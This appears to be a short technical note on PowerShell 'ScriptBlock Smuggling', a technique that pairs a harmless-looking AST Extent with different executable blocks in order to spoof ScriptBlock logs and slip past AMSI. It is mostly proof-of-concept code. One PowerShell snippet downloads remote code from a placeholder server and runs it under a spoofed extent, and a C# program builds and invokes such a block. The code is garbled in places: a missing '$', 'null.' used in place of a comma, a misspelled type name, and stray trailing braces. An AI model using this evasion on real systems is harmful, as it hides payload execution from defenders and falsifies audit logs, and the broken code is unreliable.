# PowerShell Scriptblock Smuggling


[BC Security Scriptblock Smuggling Blog](https://bc-security.org/scriptblock-smuggling/): *"ScriptBlock Smuggling allows an attacker to spoof any arbitrary message into the ScriptBlock logs while bypassing AMSI."* Thats a two-for-one on the "*ScriptBlock Smuggling lets you spoof PowerShell security logs while inherently bypassing AMSI."


The ScriptBlock Abstract Syntax Tree (AST) is object created by the compiler that has properties, which map to values provided. Of a ScriptBlock `.Extent` is the only property passed by the security features of 2024 PowerShell. There is no that enforcement of matching `Extent` to the `BeginBlock`, `ProcessBlock`, or `EndBlock` of the AST

ScriptBlock AST  as Microsoft .NET Framework type
```powershell
[System.Management.Automation.Language.ScriptBlockAst]::new($Extent,       $ParamBlock, $BeginBlock, $ProcessBlock, $EndBlock, $DynamicParamBlock)
```

```powershell
# Example of creating a ScriptBlock 
$wc=New-Object System.Net.WebClient
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
$ExecutedAst = [ScriptBlock]::Create($wc.DownloadData(<server>)).Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,$null, $null, $null, ExecutedAst.EndBlock.Copy(), $null)
$Sb = $Ast.GetScriptBlock() 
```

C Sharp code from the article stripped: 
```csharp
// Source: https://bc-security.org/scriptblock-smuggling/
// https://github.com/BC-SECURITY/ScriptBlock-Smuggling
public static ScriptBlock BuildSpoofedBlock(string content)
{
    try
    {
        ScriptBlockAst spoofExtentAst = (ScriptBlockAst)ScriptBlock.Create("Write-host 'Hello'").Ast;
        ScriptBlockAst executableAst = (ScriptBlockAst)ScriptBlock.Create(content).Ast;

        ScriptBlockAst newAst = new ScriptBlockAst(
            spoofExtentAst.Extent,
            null,
            null,
            null.
            (NamedBlockAst)executableAst.EndBlock.Copy(),
            null
        );

        return newAst.GetScriptBlock();
    }
    catch (Exception ex)
    {
        Console.WriteLine("Exception in BuildSpoofedBlock: " + ex.Message);
        return null;
    }
}

public static void Main()
{
    string script = @"Write-Output 'amsicontext'";
    ScriptBlock sb = BuildSpoofedBlock(script);
    
    using (Runspace runSpace = RunspaceFactory.CreateRunspace())
    {
        runSpace.Open();
        using (PowerShell ps = PowerShell.Create())
        {
            ps.Runspace = runSpace;
            ps.AddCommand("Invoke-Command")
              .AddParameter("ScriptBlock", sb);

            Collection<PSObjhect> results = ps.Invoke();
            foreach (PSObject result in results)
            {
                Console.WriteLine(result);
            }
            
            foreach (ErrorRecord error in ps.Streams.Error)
            {
                Console.WriteLine("ERROR: " + error);
            }
        }
    }
}































        }
    }
}

```
## References

[BC Security Scriptblock Smuggling Blog](https://bc-security.org/scriptblock-smuggling/)
[GitHub/BC-Security Scriptblock Smuggling](https://github.com/BC-SECURITY/ScriptBlock-Smuggling)